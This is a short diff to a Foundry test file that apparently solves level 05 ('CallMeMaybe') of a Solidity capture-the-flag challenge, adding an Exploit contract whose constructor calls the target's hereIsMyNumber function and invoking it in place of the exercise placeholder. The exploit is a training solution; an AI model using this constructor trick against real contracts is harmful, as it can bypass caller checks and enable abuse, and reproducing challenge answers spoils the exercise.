@@ -4,7 +4,12 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "src/05_CallMeMaybe/CallMeMaybe.sol";
 
-// forge test --match-contract CallMeMaybeTest -vvvv
+contract Exploit {
+    constructor(CallMeMaybe target) {
+        target.hereIsMyNumber();
+    }
+}
+
 contract CallMeMaybeTest is BaseTest {
     CallMeMaybe instance;
 
@@ -15,7 +20,7 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        new Exploit(instance);
 
         checkSuccess();
     }
